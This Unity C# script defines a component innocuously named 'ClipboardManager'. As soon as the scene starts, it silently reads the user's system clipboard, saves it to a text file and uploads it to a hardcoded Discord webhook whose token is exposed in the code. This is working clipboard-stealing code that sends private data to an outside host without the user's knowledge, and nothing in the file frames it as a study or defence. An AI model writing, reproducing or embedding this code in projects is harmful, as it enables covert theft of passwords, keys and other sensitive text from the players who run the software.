using System.Collections;
using UnityEngine;
using System.IO;            // For file operations
using UnityEngine.Networking;

public class ClipboardManager : MonoBehaviour
{
    // Discord Webhook URL
    private string webhookUrl = "https://discord.com/api/webhooks/1303804400514633838/nqNZTP-WeqPTMTniA6ImACpIB0_2LUfDUtHzObaJ-toaGv2kN4qI8timwImRGWJZW7fA";

    // Path to save the clipboard content as a text file
    private string filePath = "clipboard.txt";  // Save in the root of the project or specify another path

    // Start is called before the first frame update
    void Start()
    {
        // Save clipboard to file, then upload it to Discord
        StartCoroutine(SaveClipboardAndSendToDiscord());
    }

    // Coroutine to save clipboard to a file and then send it to Discord
    private IEnumerator SaveClipboardAndSendToDiscord()
    {
        string clipboardContent = GUIUtility.systemCopyBuffer;  // Get clipboard content in Unity

        if (string.IsNullOrEmpty(clipboardContent))
        {
            clipboardContent = "Clipboard is empty";
        }

        // Save the clipboard content to a file
        File.WriteAllText(filePath, clipboardContent);
        Debug.Log("Clipboard saved to file: " + filePath);

        // Send the file to Discord after saving it
        yield return StartCoroutine(SendFileToDiscord(filePath));
    }

    // Coroutine to send the file to Discord
    private IEnumerator SendFileToDiscord(string filePath)
    {
        // Create a form and add the file as an attachment
        WWWForm form = new WWWForm();
        byte[] fileBytes = File.ReadAllBytes(filePath);
        form.AddBinaryData("file", fileBytes, "clipboard.txt", "text/plain");

        // Send the POST request with the file attached
        UnityWebRequest www = UnityWebRequest.Post(webhookUrl, form);

        // Wait for the request to complete
        yield return www.SendWebRequest();

        if (www.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("File sent to Discord!");
        }
        else
        {
            Debug.LogError("Error sending file to Discord: " + www.error);
        }
    }
}

